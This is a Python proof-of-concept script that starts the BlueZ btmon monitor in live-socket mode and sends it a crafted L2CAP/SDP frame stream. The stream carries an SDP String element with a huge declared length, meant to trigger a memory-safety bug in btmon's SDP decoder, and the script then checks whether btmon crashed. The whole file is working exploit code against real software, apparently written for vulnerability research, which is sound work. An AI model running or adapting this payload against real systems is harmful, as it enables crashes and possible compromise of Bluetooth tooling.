#!/usr/bin/env python3
"""live_socket_probe.py — test whether btmon's LIVE server socket path reaches
the vulnerable SDP decoder, and whether it crashes like the file path.

btmon -s <sock>  listens on a PF_UNIX SOCK_STREAM socket; a client sends
  struct mgmt_hdr { u16 opcode; u16 index; u16 len; } + payload
and control.c:client_callback -> packet_monitor() decodes it exactly as a
captured packet.  opcode 0x02 = HCI_ACLDATA_PKT.

We replay the same crafted L2CAP/SDP flow used by the btsnoop PoC, but as raw
socket writes instead of a file.
"""
import socket, struct, subprocess, sys, time, os, signal

SOCK = "/tmp/btmon-live.sock"
BUF  = 65536

# ---- same frames as mk_btsnoop_sdp.py, but without btsnoop framing ----
def hci_acl(handle, dlen):            # handle flags=0x00 (ACL TX style)
    return struct.pack("<HH", handle, dlen)

def l2cap(cid, payload):
    return struct.pack("<HH", len(payload), cid) + payload

def conn_req(ident, psm, scid):
    return struct.pack('<BBHHH', 0x02, ident, 4, psm, scid)

def conn_rsp(ident, dcid, scid):
    return struct.pack('<BBHHHHH', 0x03, ident, 8, dcid, scid, 0x0000, 0x0000)

def sdp_pdu(pdu_id, tid, body):
    return struct.pack(">B", pdu_id) + struct.pack(">H", tid) + struct.pack(">H", len(body)) + body

def mgmt(opcode, index, payload):
    return struct.pack("<HHH", opcode, index, len(payload)) + payload

def build_stream(datalen):
    SCID, DCID = 0x0040, 0x0041
    out = b""
    # outgoing conn req (index 0)
    cr = conn_req(0x01, 0x0001, SCID)
    out += mgmt(0x04, 0, hci_acl(0x0001, len(l2cap(0x0001, cr))) + l2cap(0x0001, cr))  # ACL_TX sig
    # incoming conn rsp
    rs = conn_rsp(0x01, DCID, SCID)
    out += mgmt(0x05, 0, hci_acl(0x0001, len(l2cap(0x0001, rs))) + l2cap(0x0001, rs))  # ACL_RX sig
    # SDP service-search-attribute response carrying the poisoned String element
    string_elem = bytes([0x27]) + struct.pack(">I", datalen) + b"ABCD"
    attr_list = bytes([0x35, len(string_elem)]) + string_elem
    body = struct.pack(">H", len(attr_list)) + attr_list + b"\x00"
    pdu = sdp_pdu(0x07, 0x0002, body)
    out += mgmt(0x05, 0, hci_acl(0x0001, len(l2cap(SCID, pdu))) + l2cap(SCID, pdu))  # ACL_RX
    return out

def main():
    datalen = int(sys.argv[1], 0) if len(sys.argv) > 1 else 0xFFFFFFFE
    if os.path.exists(SOCK): os.unlink(SOCK)
    # launch btmon in server mode
    btmon = subprocess.Popen(["btmon", "-s", SOCK, "-P"],
                             stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                             text=True, bufsize=1)
    # wait for the socket to appear
    for _ in range(50):
        if os.path.exists(SOCK): break
        time.sleep(0.05)
    if not os.path.exists(SOCK):
        print("FAIL: btmon did not create the server socket")
        btmon.kill(); return 2
    time.sleep(0.2)
    c = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    c.connect(SOCK)
    c.sendall(build_stream(datalen))
    time.sleep(1.0)
    # is btmon alive?
    rc = btmon.poll()
    print(f"datalen=0x{datalen:X}  btmon alive_after_send={rc is None}  exit={rc}")
    try:
        btmon.terminate(); btmon.wait(timeout=2)
    except Exception:
        btmon.kill()
    out = btmon.stdout.read() if btmon.stdout else ""
    print("--- btmon output tail ---")
    print("\n".join(out.splitlines()[-12:]))
    return 0 if rc is None else 1

if __name__ == "__main__":
    sys.exit(main())
